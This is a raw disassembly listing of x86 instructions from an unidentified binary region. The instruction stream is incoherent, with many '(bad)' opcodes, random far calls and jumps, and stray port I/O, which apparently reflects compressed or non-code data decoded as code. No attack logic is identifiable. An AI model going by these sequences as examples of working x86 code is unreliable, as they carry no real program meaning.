  422640:	adc    BYTE PTR [edx+0x9],0x7d
  422644:	ja     0x4225dc
  422646:	adc    eax,ebp
  422648:	leave  
  422649:	xor    BYTE PTR [edi+0x63],dl
  42264c:	call   DWORD PTR [esi+eiz*4]
  42264f:	ret    0xa8e9
  422652:	pop    edx
  422653:	(bad)  
  422654:	out    0xa2,al
  422656:	or     BYTE PTR [edx+0xf],bl
  422659:	and    eax,esi
  42265b:	inc    edi
  42265c:	cwde   
  42265d:	push   ecx
  42265e:	dec    ebx
  42265f:	bnd call 0x73432a33
  422665:	mov    BYTE PTR [edi+ecx*2+0x75d54031],dl
  42266c:	adc    DWORD PTR [ebx+0x1220f065],0xc96af8e2
  422676:	loopne 0x422630
  422678:	mov    BYTE PTR [edx+ecx*8+0x221a3543],al
  42267f:	inc    ecx
  422680:	jnp    0x422620
  422682:	aam    0xb
  422684:	push   DWORD PTR [esi+edx*4]
  422687:	(bad)  
  422688:	out    dx,al
  422689:	jb     0x42269f
  42268b:	push   ebp
  42268c:	push   esi
  42268d:	push   ebx
  42268e:	(bad)  
  42268f:	sbb    ch,bl
  422691:	mov    al,0x82
  422693:	or     DWORD PTR [esi],esi
  422695:	fmul   st,st(2)
  422697:	xor    ah,0x16
  42269a:	retf   0xce6
  42269d:	fcom   DWORD PTR [edi]
  42269f:	fwait
  4226a0:	jp     0x422711
  4226a2:	iret   
  4226a3:	das    
  4226a4:	lock rcl DWORD PTR [eax+0x53],0x71
  4226a9:	test   eax,0xef8e3695
  4226ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226af:	xchg   edi,eax
  4226b0:	sar    DWORD PTR [esi-0x63],cl
  4226b3:	les    edx,FWORD PTR [edi-0x4dd6056e]
  4226b9:	loope  0x4226e2
  4226bb:	pusha  
  4226bc:	scas   eax,DWORD PTR es:[edi]
  4226bd:	jg     0x4226ee
  4226bf:	ja     0x42272c
  4226c1:	mov    cl,0x82
  4226c3:	sbb    ebx,DWORD PTR [edi]
  4226c5:	iret   
  4226c6:	js     0x422714
  4226c8:	cmc    
  4226c9:	mov    WORD PTR [ebp+0x26a7f824],?
  4226cf:	sub    DWORD PTR [ebx+0x1d],0xffffffe8
  4226d3:	and    eax,0x873457cb
  4226d8:	mov    ebp,0x20271f47
  4226dd:	cdq    
  4226de:	cld    
  4226df:	add    cl,ah
  4226e1:	push   ecx
  4226e2:	push   ecx
  4226e3:	mov    esi,0x6c16d63e
  4226e8:	icebp  
  4226e9:	adc    al,0x16
  4226eb:	(bad)  
  4226ec:	mov    esp,0x13336b19
  4226f1:	jnp    0x422673
  4226f3:	or     DWORD PTR [edi+0x7cc97f92],0xffffffbb
  4226fa:	call   0xcfc8:0xc3e168dd
  422701:	xchg   esp,eax
  422702:	imul   edi,DWORD PTR [esi],0x5f40c458
  422708:	sahf   
  422709:	fs sti 
  42270b:	add    esi,DWORD PTR [edx]
  42270d:	fldcw  WORD PTR [eax]
  42270f:	mov    al,0xe5
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x6a7f01c8
  422781:	inc    ebp
  422782:	add    eax,0x16fe3c6
  422787:	add    BYTE PTR ds:0xdb000001,al
  42278d:	jg     0x422739
  42278f:	cmp    ah,BYTE PTR [edi-0x46]
  422792:	mov    cl,BYTE PTR [edx]
  422794:	cmp    al,cl
  422796:	xchg   ebp,eax
  422797:	pmuludq mm7,mm5
  42279a:	jno    0x422723
  42279c:	fisttp QWORD PTR [esi]
  42279e:	fiadd  DWORD PTR ds:0x7b3f9e17
  4227a4:	clc    
  4227a5:	mov    al,ds:0xbdfeb3d9
  4227aa:	mov    ch,0x1c
  4227ac:	sbb    ebx,DWORD PTR [edx]
  4227ae:	cmp    ebx,edx
  4227b0:	mov    edi,0xeb4a4850
  4227b5:	xor    bl,BYTE PTR [edi]
  4227b7:	not    DWORD PTR [edx-0xf0262b1]
  4227bd:	push   eax
  4227be:	adc    eax,0x7e26b78a
  4227c3:	ficom  WORD PTR [ebx-0x66a43c9c]
  4227c9:	pop    ecx
  4227ca:	add    al,0xf8
  4227cc:	pop    esi
  4227cd:	and    eax,0xb44f0279
  4227d2:	(bad)  
  4227d3:	test   ebp,0x260750e6
  4227d9:	dec    ebx
  4227da:	push   es
  4227db:	fmul   st(7),st
  4227dd:	sub    dl,BYTE PTR [edx-0x69c46305]
  4227e3:	out    0xc2,eax
  4227e5:	dec    ebx
  4227e6:	pop    edi
  4227e7:	or     ebp,DWORD PTR [ebx]
  4227e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ea:	fldenv [ebx-0x7b640338]
  4227f0:	aam    0x79
  4227f2:	aas    
  4227f3:	sub    al,0xa3
  4227f5:	ds push ebx
  4227f7:	nop
  4227f8:	xor    bl,BYTE PTR [ecx+0x61]
  4227fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227fc:	retf   
  4227fd:	(bad)  
  4227fe:	(bad)  
  4227ff:	dec    ecx
  422800:	fld    TBYTE PTR [ebx+esi*8+0x1b]
  422804:	push   ecx
  422805:	out    0xec,al
  422807:	adc    dl,BYTE PTR [ebp-0x3f]
  42280a:	test   BYTE PTR [edx],0xb9
  42280d:	dec    edi
  42280e:	mov    esi,0x591adcb1
  422813:	jo     0x4227d9
  422815:	dec    eax
  422816:	push   ebx
  422817:	or     dl,al
  422819:	inc    esi
  42281a:	movzx  ebx,WORD PTR [ecx-0x65]
  42281e:	sar    ah,0xa7
  422821:	xchg   esi,eax
  422822:	xchg   esp,eax
  422823:	pusha  
  422824:	test   BYTE PTR [esi+ecx*1-0x69],ah
  422828:	push   ss
  422829:	inc    esi
  42282a:	jecxz  0x42285e
  42282c:	pop    ecx
  42282d:	mov    ds:0xf76a445c,eax
  422832:	dec    ecx
  422833:	add    BYTE PTR [ecx-0x50],al
  422836:	adc    al,ch
  422838:	leave  
  422839:	dec    ecx
  42283a:	jne    0x42284a
  42283c:	jl     0x42287c
  42283e:	sbb    al,0xb8
  422840:	fbstp  TBYTE PTR [ebx]
  422842:	adc    bl,BYTE PTR [esi+esi*2-0x34b62c2e]
  422849:	mov    al,0xe7
  42284b:	dec    eax
  42284c:	jge    0x4228a1
  42284e:	das    
  42284f:	(bad)  
  422850:	iret   
  422851:	in     eax,0x66
  422853:	jns    0x4228b0
  422855:	jo     0x4227ff
  422857:	sub    esi,DWORD PTR [eax-0x29c8e77]
  42285d:	sbb    dh,BYTE PTR [ebx]
  42285f:	xor    al,0x0
  422861:	xor    eax,0xc4ac7934
  422866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422867:	inc    esi
  422869:	mov    ds:0x9deca5db,al
  42286e:	inc    esp
  42286f:	jbe    0x4228ed
  422871:	mul    DWORD PTR [ecx]
  422873:	pushf  
  422874:	aas    
  422875:	int3   
  422876:	xor    edi,ebp
  422878:	aaa    
  422879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42287a:	push   0xffffffa8
  42287c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287d:	jl     0x4228fb
  42287f:	sub    DWORD PTR [ebx-0x55],0x21085639
  422886:	jl     0x4228f8
  422888:	mov    al,0xe0
  42288a:	pop    ecx
  42288b:	aas    
  42288c:	fstp   QWORD PTR [eax]
  42288e:	and    BYTE PTR [ebx+0x45],ch
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x42291e
  422901:	bnd jg 0x4228ea
  422904:	call   0x5422a79
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    BYTE PTR [edx],bh
  42290d:	fsubr  QWORD PTR [ebx+0x61ca1d9a]
  422913:	xor    BYTE PTR [ebx],bh
  422915:	xchg   edi,eax
  422916:	mov    bl,0x1
  422918:	adc    esp,DWORD PTR [ecx-0x3bd44ffd]
  42291e:	jo     0x422943
  422920:	mov    ds:0x85d93f9e,eax
  422925:	outs   dx,BYTE PTR ds:[esi]
  422926:	xchg   edx,eax
  422927:	adc    DWORD PTR [esi],ebp
  422929:	xor    BYTE PTR [eax],cl
  42292b:	cmc    
  42292c:	(bad)  
  42292d:	loope  0x42290b
  42292f:	lods   eax,DWORD PTR ds:[esi]
  422930:	push   cs
  422931:	xor    bl,BYTE PTR [eax+0x5a756b97]
  422937:	popa   
  422938:	mov    al,0xc5
  42293a:	call   0x6ccf:0x18d44182
  422941:	retf   0xaf8b
  422944:	call   0xdd5db9a6
  422949:	lss    eax,FWORD PTR [ebp-0x24ab0e9e]
  422950:	sub    eax,0x3eafb766
  422955:	mov    esp,0xcecb7e6f
  42295a:	xor    edx,DWORD PTR ds:0x80c69fbb
  422960:	imul   eax,DWORD PTR [ebx],0xa69c3253
  422966:	mov    ch,0x94
  422968:	int    0x9
  42296a:	in     al,0x1e
  42296c:	data16 sbb BYTE PTR [edi+0x3039f89c],al
  422973:	push   ecx
  422974:	lods   eax,DWORD PTR ds:[esi]
  422975:	stc    
  422976:	or     eax,0x199321c4
  42297b:	lea    eax,[ecx+0x764d0270]
  422981:	test   BYTE PTR [edi],0x4e
  422984:	xor    al,0xe
  422986:	loop   0x42291b
  422988:	int3   
  422989:	loop   0x4229fd
  42298b:	scas   eax,DWORD PTR es:[edi]
  42298c:	retf   0xdf2c
  42298f:	not    ebp
  422991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422992:	aaa    
  422993:	inc    eax
  422994:	ins    DWORD PTR es:[edi],dx
  422995:	push   eax
  422996:	pop    esi
  422997:	xchg   ebp,eax
  422998:	or     bl,al
  42299a:	stos   BYTE PTR es:[edi],al
  42299b:	sub    BYTE PTR [edi+0x46],bl
  42299e:	mov    bh,0x5a
  4229a0:	jmp    0xf8748c33
  4229a5:	std    
  4229a6:	lock bound ebp,QWORD PTR [esi+0x55]
  4229aa:	ds scas eax,DWORD PTR es:[edi]
  4229ac:	xor    ch,dl
  4229ae:	test   DWORD PTR cs:[eax],edi
  4229b1:	adc    ecx,esp
  4229b3:	icebp  
  4229b4:	sbb    DWORD PTR [edi],edi
  4229b6:	and    al,0xec
  4229b8:	pop    ecx
  4229b9:	(bad)
  4229bc:	cmc    
  4229bd:	stos   BYTE PTR es:[edi],al
  4229be:	xor    eax,0xdd22c74
  4229c3:	bound  esp,QWORD PTR [edi+0x1a]
  4229c6:	inc    esp
  4229c7:	aam    0x3b
  4229c9:	jb     0x42296a
  4229cb:	dec    esi
  4229cc:	add    bh,dh
  4229ce:	jmp    0xf22f05de
  4229d3:	pop    edx
  4229d4:	mov    ch,0xf7
  4229d6:	jecxz  0x4229b3
  4229d8:	jae    0x4229f1
  4229da:	inc    esp
  4229db:	rol    BYTE PTR [eax+0x51],1
  4229de:	dec    edi
  4229df:	cmp    ch,BYTE PTR [edi+0x5ae8728c]
  4229e5:	xchg   DWORD PTR [ebx+eiz*2],edx
  4229e8:	pop    es
  4229e9:	mov    ds:0x390a7d1b,al
  4229ee:	jmp    0xda5:0xa6399de0
  4229f5:	pop    ebx
  4229f6:	push   ecx
  4229f7:	and    DWORD PTR [eax+ebp*2],eax
  4229fa:	frstor [esi-0x5f2ccea2]
  422a00:	xchg   DWORD PTR [ecx],ebp
  422a02:	mov    bh,0xf
  422a04:	mov    dh,0xc2
  422a06:	xor    eax,esp
  422a08:	jno    0x4229db
  422a0a:	rcl    ebx,0x30
  422a0d:	inc    eax
  422a0e:	scas   al,BYTE PTR es:[edi]
  422a0f:	adc    esi,ebp
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	jmp    0xee12713f
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0x89000001,al
  422a8d:	mov    ecx,ds
  422a8f:	daa    
  422a90:	test   BYTE PTR [edx],ch
  422a92:	xor    bh,ah
  422a94:	out    dx,al
  422a95:	xchg   esp,eax
  422a96:	dec    edi
  422a97:	stos   BYTE PTR es:[edi],al
  422a98:	and    al,0x97
  422a9a:	in     eax,dx
  422a9b:	inc    edi
  422a9c:	jo     0x422ac8
  422a9e:	popa   
  422a9f:	jmp    0x76722952
  422aa4:	sub    cl,BYTE PTR [edx-0x69a46c7b]
  422aaa:	inc    edi
  422aab:	push   ecx
  422aac:	sub    edx,DWORD PTR [edx]
  422aae:	cwde   
  422aaf:	div    DWORD PTR [ecx+0x5836127b]
  422ab5:	loope  0x422a40
  422ab7:	retf   0x93ac
  422aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422abb:	(bad)  
  422abc:	stc    
  422abd:	add    eax,0x9104274
  422ac2:	adc    DWORD PTR [edx-0x34],ebx
  422ac5:	ret    
  422ac6:	add    eax,0x6a998a49
  422acb:	mov    edx,DWORD PTR [ebp-0x61]
  422ace:	iret   
  422acf:	sub    al,0xed
  422ad1:	jae    0x422acf
  422ad3:	cmp    BYTE PTR [edi*8-0x48d7108e],bl
  422ada:	cmp    ah,BYTE PTR [eax]
  422adc:	inc    esp
  422add:	and    edi,ebx
  422adf:	add    ebx,DWORD PTR ss:[ecx+0x5d]
  422ae3:	dec    esp
  422ae4:	nop
  422ae5:	jnp    0x422ad0
  422ae7:	mov    edi,0xf5527d0e
  422aec:	cwde   
  422aed:	xchg   edx,eax
  422aee:	xchg   esi,eax
  422aef:	pusha  
  422af0:	call   0x2813d36e
  422af5:	jns    0x422add
  422af7:	dec    esp
  422af8:	jmp    0x422afe
  422afa:	lahf   
  422afb:	loope  0x422aee
  422afd:	dec    edi
  422afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aff:	inc    edx
  422b00:	mov    al,0x83
  422b02:	enter  0xfb41,0xde
  422b06:	in     al,dx
  422b07:	leave  
  422b08:	pop    edx
  422b09:	call   0x62f5f4fb
  422b0e:	not    dl
  422b10:	mov    ds:0xe33e532,al
  422b15:	adc    DWORD PTR [edi-0x60],ecx
  422b18:	cwde   
  422b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b1a:	mov    ch,0x27
  422b1c:	and    eax,0xd0ddc487
  422b21:	push   eax
  422b22:	jg     0x422af1
  422b24:	lahf   
  422b25:	fdivr  QWORD PTR [eax-0xe95a407]
  422b2b:	cdq    
  422b2c:	xor    edx,ebp
  422b2e:	test   al,0x91
  422b30:	adc    al,0x57
  422b32:	dec    edi
  422b33:	inc    esi
  422b34:	mov    al,ds:0xdf9ffd28
  422b39:	xchg   DWORD PTR [edx-0x79259ce9],esi
  422b3f:	jp     0x422b41
  422b41:	shl    DWORD PTR [esi+ecx*2],cl
  422b44:	fld    st(7)
  422b46:	dec    ebp
  422b47:	inc    eax
  422b48:	cmp    eax,0x78951613
  422b4d:	pop    esi
  422b4e:	stc    
  422b4f:	das    
  422b50:	pop    ebp
  422b51:	inc    ebp
  422b52:	test   BYTE PTR [ebp+0x1f],0x28
  422b56:	push   esi
  422b57:	cmp    BYTE PTR [ebp+0xe],0x89
  422b5b:	sub    al,0x6c
  422b5d:	pop    ecx
  422b5e:	outs   dx,DWORD PTR ds:[esi]
  422b5f:	cmp    esi,DWORD PTR [ebp+edi*8+0x257aa756]
  422b66:	jno    0x422b6d
  422b68:	adc    ecx,DWORD PTR [bp-0x52]
  422b6c:	stos   BYTE PTR es:[edi],al
  422b6d:	shl    BYTE PTR ds:0x1a872f6c,1
  422b73:	pop    ds
  422b74:	aam    0x47
  422b76:	aas    
  422b77:	call   0x9167:0x769a129c
  422b7e:	or     eax,0x62552ef
  422b83:	inc    edx
  422b84:	sbb    DWORD PTR [esi-0x3],eax
  422b87:	or     eax,0xbfc35ff2
  422b8c:	sub    al,0x69
  422b8e:	repnz pop edx
  422b90:	pop    eax
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x52fbb264]
  422c02:	pop    esi
  422c03:	xchg   esp,eax
  422c04:	bnd jb 0x422c08
  422c07:	add    BYTE PTR ds:0x7f000001,al
  422c0d:	iret   
  422c0e:	(bad)
  422c11:	ins    BYTE PTR es:[edi],dx
  422c12:	mov    ds:0x5a466855,al
  422c17:	and    BYTE PTR [edx],0x86
  422c1a:	(bad)  
  422c1b:	sub    al,0x3c
  422c1d:	push   0xefb89eab
  422c22:	clc    
  422c23:	test   al,0xfa
  422c25:	sar    eax,cl
  422c27:	mov    ah,0x29
  422c29:	jge    0x422c84
  422c2b:	add    BYTE PTR [eax+0x44],ch
  422c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c2f:	stc    
  422c30:	or     bh,BYTE PTR [edx-0x51d43a6f]
  422c36:	cmp    al,0x1b
  422c38:	jecxz  0x422c46
  422c3a:	lods   al,BYTE PTR ds:[esi]
  422c3b:	rol    esp,1
  422c3d:	imul   ebx,DWORD PTR [esi-0x74],0x9d13b731
  422c44:	mov    eax,ds:0xc3ee768
  422c49:	xlat   BYTE PTR ds:[ebx]
  422c4a:	mov    dh,0x26
  422c4c:	fild   DWORD PTR [eax]
  422c4e:	(bad)  
  422c4f:	xchg   edi,eax
  422c50:	ret    0xb183
  422c53:	(bad)  
  422c54:	jl     0x422c40
  422c56:	imul   esp,esi,0x81d8e488
  422c5c:	fsub   DWORD PTR [ebp-0x10155261]
  422c62:	jb     0x422c82
  422c64:	mov    eax,ebx
  422c66:	adc    ecx,DWORD PTR [edi+0x27]
  422c69:	sbb    al,0xf7
  422c6b:	add    eax,0x3197d2db
  422c70:	scas   al,BYTE PTR es:[edi]
  422c71:	adc    eax,0x14be3050
  422c76:	adc    BYTE PTR [edx],0x8b
  422c79:	clc    
  422c7a:	shl    BYTE PTR [esi+0x5b],1
  422c7d:	fstp   TBYTE PTR [ebx+0x4b83053f]
  422c83:	les    ecx,FWORD PTR [eax]
  422c85:	jmp    0x3888:0x85cfb2da
  422c8c:	or     bh,bl
  422c8e:	push   ebx
  422c8f:	rcr    DWORD PTR [esi+0x4b09fcc5],1
  422c95:	inc    edx
  422c96:	dec    ecx
  422c97:	mov    al,ds:0x63d0ff1f
  422c9c:	or     eax,ebp
  422c9e:	loope  0x422c60
  422ca0:	mov    esp,0xf1ee2589
  422ca5:	adc    dl,cl
  422ca7:	pop    ebx
  422ca8:	mov    ebx,0x63176bef
  422cad:	or     ecx,DWORD PTR [esi+eax*8-0x2c7f4724]
  422cb4:	outs   dx,DWORD PTR ds:[esi]
  422cb5:	cdq    
  422cb6:	and    ch,dh
  422cb8:	stos   BYTE PTR es:[edi],al
  422cb9:	dec    esi
  422cba:	leave  
  422cbb:	jb     0x422d03
  422cbd:	or     al,0xd7
  422cbf:	mov    ?,ecx
  422cc1:	imul   ebx,DWORD PTR [ecx+0x7c33e50a],0xee07cc81
  422ccb:	xchg   DWORD PTR ds:0x85f81f21,ebx
  422cd1:	mov    BYTE PTR ds:0xceb5e9,ch
  422cd7:	icebp  
  422cd8:	mov    ecx,0xb19d6d71
  422cdd:	jmp    0x422cf3
  422cdf:	in     eax,0xbd
  422ce1:	push   es
  422ce2:	push   eax
  422ce3:	jae    0x422ca4
  422ce5:	aam    0x81
  422ce7:	push   edi
  422ce8:	adc    ebp,edx
  422cea:	push   0x4c1df848
  422cef:	mov    ebx,DWORD PTR [edi+0x15daa597]
  422cf5:	stos   BYTE PTR es:[edi],al
  422cf6:	(bad)  
  422cf8:	loop   0x422c90
  422cfa:	stos   BYTE PTR es:[edi],al
  422cfb:	mov    ds:0x4959ad95,eax
  422d00:	addr16 xchg edx,eax
  422d02:	dec    ecx
  422d03:	jne    0x422d67
  422d05:	mov    al,0x83
  422d07:	pop    ds
  422d08:	sub    BYTE PTR [esi],bl
  422d0a:	add    DWORD PTR [ebp-0x39],esi
  422d0d:	lods   eax,DWORD PTR ds:[esi]
  422d0e:	das    
  422d0f:	je     0x422cd2
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    eax,DWORD PTR [esi-0x80bfb30]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR ds:0xba000001,al
  422d8d:	mov    edi,DWORD PTR [edi-0x77]
  422d90:	stos   BYTE PTR es:[edi],al
  422d91:	add    al,0x7
  422d93:	arpl   WORD PTR [ebp+0x79],bx
  422d96:	loopne 0x422ddc
  422d98:	sahf   
  422d99:	mov    bh,0x6d
  422d9b:	xchg   edx,eax
  422d9c:	pusha  
  422d9d:	dec    edi
  422d9e:	repnz out dx,eax
  422da0:	sahf   
  422da1:	mov    bh,0x1
  422da3:	xchg   edi,eax
  422da4:	sub    al,0xdd
  422da6:	ins    BYTE PTR es:[edi],dx
  422da7:	gs adc eax,0x19fb09ec
  422dad:	cmp    al,0x1e
  422daf:	jl     0x422d99
  422db1:	das    
  422db2:	push   ebp
  422db3:	mov    ecx,0xc2bc1144
  422db8:	jb     0x422e1c
  422dba:	adc    edx,0xffffff8c
  422dbd:	add    bl,cl
  422dbf:	pop    ebp
  422dc0:	push   es
  422dc1:	and    eax,DWORD PTR [ecx+0x2658c641]
  422dc7:	and    DWORD PTR [eax],esi
  422dc9:	pop    ds
  422dca:	or     dh,0x91
  422dcd:	push   esi
  422dce:	add    DWORD PTR [ebp+0x2c544213],0xfffffff4
  422dd5:	mov    ecx,DWORD PTR [eax+0x0]
  422dd8:	xor    al,0x67
  422dda:	addr16 dec eax
  422ddc:	cmp    dh,bh
  422dde:	cmp    bh,cl
  422de0:	push   ds
  422de1:	sbb    eax,0xa6fc1b37
  422de6:	arpl   WORD PTR [edi],ax
  422de8:	loope  0x422d6b
  422dea:	sub    eax,0xb3555d9
  422def:	int    0xad
  422df1:	dec    edi
  422df2:	mov    ds,WORD PTR [eax-0x73]
  422df5:	pushf  
  422df6:	aam    0xa4
  422df8:	in     al,0x11
  422dfa:	movhps xmm7,QWORD PTR [ebp+ebp*8-0x7bda11dc]
  422e02:	jmp    0x923ed235
  422e07:	push   ss
  422e08:	mov    bh,0xa5
  422e0a:	addr16 pusha 
  422e0c:	cli    
  422e0d:	mov    ds:0x69c55d72,eax
  422e12:	pop    ecx
  422e13:	sub    dh,dl
  422e15:	inc    BYTE PTR [ecx-0x4c]
  422e18:	pop    ebp
  422e19:	jmp    0xd8255ee9
  422e1e:	(bad)  
  422e20:	pop    ecx
  422e21:	je     0x422e7f
  422e23:	sti    
  422e24:	cmp    BYTE PTR [ebp+edi*2-0x52face36],cl
  422e2b:	jecxz  0x422e7b
  422e2d:	std    
  422e2e:	push   eax
  422e2f:	jnp    0x422e6a
  422e31:	dec    ecx
  422e32:	sub    esi,DWORD PTR [ecx-0x3c955fbb]
  422e38:	daa    
  422e39:	adc    BYTE PTR [esi+0x5c4fe3ec],dh
  422e3f:	jg     0x422dcf
  422e41:	out    dx,al
  422e42:	inc    esp
  422e43:	fdivr  DWORD PTR [esi+eax*1-0x7289fc4b]
  422e4a:	(bad)  
  422e4b:	(bad)  [ebx+esi*8+0x16]
  422e4f:	mov    edx,0x33adc2c6
  422e54:	cmp    al,0x68
  422e56:	int3   
  422e57:	call   0xbe98:0x7dac33ee
  422e5e:	sbb    BYTE PTR [edi+0xe7d0663],0x24
  422e65:	imul   edx,DWORD PTR [eax],0x8a21e3d7
  422e6b:	sahf   
  422e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e6d:	add    al,0x66
  422e6f:	shl    DWORD PTR [edx],1
  422e71:	das    
  422e72:	pushf  
  422e73:	shr    ch,cl
  422e75:	sbb    ebp,DWORD PTR [esi]
  422e77:	mov    ebx,0x96fd1c76
  422e7c:	out    0x48,al
  422e7e:	ror    dl,1
  422e80:	sbb    ah,BYTE PTR [ebx-0x66e86218]
  422e86:	cmp    al,0x26
  422e88:	pushf  
  422e89:	scas   al,BYTE PTR es:[edi]
  422e8a:	mov    gs,WORD PTR [edx]
  422e8c:	enter  0x2527,0x9c
  422e90:	je     0x422e92
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x67d8ca33
  422f02:	in     al,dx
  422f03:	cmp    ah,bh
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x29000001,al
  422f0d:	dec    ebp
  422f0e:	add    DWORD PTR ds:0xc643e2fc,0x141c0ab4
  422f18:	dec    edx
  422f19:	mov    ebx,0xe979fc3c
  422f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f1f:	icebp  
  422f20:	jno    0x422eb8
  422f22:	mov    DWORD PTR [edx],ebp
  422f24:	clc    
  422f25:	ins    DWORD PTR es:[edi],dx
  422f26:	rol    ebx,1
  422f28:	inc    ecx
  422f29:	mov    eax,0xf17b3ec7
  422f2e:	and    al,0xe5
  422f30:	popa   
  422f31:	repz pop edx
  422f33:	out    dx,eax
  422f34:	out    0xac,al
  422f36:	pop    es
  422f37:	shl    ah,0x1c
  422f3a:	jp     0x422f30
  422f3c:	mov    dl,0x2
  422f3e:	sbb    BYTE PTR [eax+0x4874f1d3],0x48
  422f45:	mov    esi,0xcefd45b9
  422f4a:	inc    esp
  422f4b:	jmp    0x66e9:0xb50a0619
  422f52:	xchg   DWORD PTR [ebp-0x9fff3bd],ebx
  422f58:	pop    esp
  422f59:	xlat   BYTE PTR ds:[ebx]
  422f5a:	mov    dl,0xe7
  422f5c:	dec    ecx
  422f5d:	sbb    BYTE PTR fs:[edi],bl
  422f60:	ins    BYTE PTR es:[edi],dx
  422f61:	jno    0x422f9e
  422f63:	pop    ss
  422f64:	arpl   WORD PTR [ebx],sp
  422f66:	xchg   BYTE PTR [ebx],al
  422f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f69:	aaa    
  422f6a:	inc    edi
  422f6b:	sub    ebx,DWORD PTR [edx+0x22]
  422f6e:	(bad)  
  422f6f:	and    dl,al
  422f71:	sbb    al,0x8a
  422f73:	inc    eax
  422f74:	cmp    DWORD PTR [ebx-0xf9ec4f9],esi
  422f7a:	inc    eax
  422f7b:	scas   al,BYTE PTR es:[edi]
  422f7c:	jg     0x422fde
  422f7e:	adc    DWORD PTR [ecx+0x2af033c5],esi
  422f84:	aas    
  422f85:	mov    eax,0x91762d78
  422f8a:	xchg   DWORD PTR [ebx],edx
  422f8c:	stos   DWORD PTR es:[edi],eax
  422f8d:	ficom  WORD PTR [eax+0x424b46a1]
  422f93:	xchg   ecx,eax
  422f94:	in     eax,0x1d
  422f96:	push   eax
  422f97:	rol    ecx,1
  422f99:	test   BYTE PTR [edx+edi*4+0x66],0x52
  422f9e:	xchg   esp,eax
  422f9f:	daa    
  422fa0:	inc    ebx
  422fa1:	push   0x2843246e
  422fa6:	xor    eax,0x66c2a93e
  422fab:	(bad)  
  422fac:	mov    es,WORD PTR [ebx]
  422fae:	ds inc edi
  422fb0:	pop    es
  422fb1:	inc    cx
  422fb3:	mov    eax,ds:0x3cc7123
  422fb8:	sti    
  422fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fba:	pop    esi
  422fbb:	pop    ss
  422fbc:	daa    
  422fbd:	mov    ebp,0xc9067429
  422fc2:	mov    bl,0x2d
  422fc4:	retf   
  422fc5:	mov    al,0xab
  422fc7:	mov    eax,ds:0xeec445d2
  422fcc:	cmc    
  422fcd:	push   0x972b689e
  422fd2:	jge    0x422f61
  422fd4:	mov    ecx,0x847eec30
  422fd9:	mov    edx,0xd5c88d0c
  422fde:	or     eax,ecx
  422fe0:	mov    ch,BYTE PTR [edx-0x77457d76]
  422fe6:	or     eax,0x5b4c4d74
  422feb:	jle    0x422f92
  422fed:	push   es
  422fee:	int3   
  422fef:	scas   al,BYTE PTR es:[edi]
  422ff0:	inc    esp
  422ff1:	mov    bh,0x34
  422ff3:	jge    0x42300a
  422ff5:	cld    
  422ff6:	stos   BYTE PTR es:[edi],al
  422ff7:	push   ebp
  422ff8:	adc    ebx,ecx
  422ffa:	jbe    0x423030
  422ffc:	jmp    0x422fc9
  422ffe:	out    dx,eax
  422fff:	dec    eax
  423000:	out    0xd8,eax
  423002:	mov    DWORD PTR [esi-0x1f56883a],eax
  423008:	imul   esi,DWORD PTR [ebx+edi*8+0x172ccfec],0x7939
	...
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebx+ebx*1+0x13fb559],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x5f000001,al
  42308d:	retf   0xae8f
  423090:	int    0x63
  423092:	icebp  
  423093:	ror    DWORD PTR [edx-0x176a0e8],cl
  423099:	inc    edx
  42309a:	sar    BYTE PTR [esi+edx*1+0x2f],1
  42309e:	dec    eax
  42309f:	mov    ah,0xb1
  4230a1:	mov    eax,0xe9945d3c
  4230a6:	test   BYTE PTR [esp+edx*1],ah
  4230a9:	cld    
  4230aa:	add    ch,BYTE PTR [ecx*4-0x399e8b40]
  4230b1:	add    bl,BYTE PTR [edi]
